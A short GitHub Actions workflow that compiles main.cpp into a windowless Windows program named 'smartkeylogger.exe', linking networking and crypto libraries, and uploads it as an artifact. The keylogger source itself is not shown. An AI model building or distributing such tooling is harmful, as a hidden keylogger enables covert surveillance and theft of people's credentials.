name: Build Smart Keylogger

on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Build with MSVC
      shell: cmd
      run: |
        cl main.cpp /Fe:smartkeylogger.exe /EHsc /O2 /MT /link /SUBSYSTEM:WINDOWS ^
        winhttp.lib user32.lib shell32.lib ole32.lib kernel32.lib ^
        gdi32.lib crypt32.lib iphlpapi.lib ws2_32.lib advapi32.lib ^
        /DEBUG:NONE /OPT:REF
        
    - name: Upload artifact
      uses: actions/upload-artifact@v4
      with:
        name: smartkeylogger
        path: smartkeylogger.exe
